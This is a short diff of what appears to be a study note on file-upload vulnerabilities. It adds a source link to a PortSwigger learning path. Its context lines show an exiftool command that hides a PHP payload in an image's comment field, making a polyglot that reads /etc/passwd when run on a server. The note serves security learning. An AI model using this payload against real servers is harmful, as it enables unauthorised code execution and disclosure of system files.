@@ -55,3 +55,6 @@ Create a polyglot using `exiftool` in linux terminal.
 ```sh
 exiftool -Comment="<?php echo 'START: ' . file_get_contents('/etc/passwd') . ' :END'; ?>" image.jpg -o polyglot.php
 ```
+
+# Sources
+- Main info (Portswigger): https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities
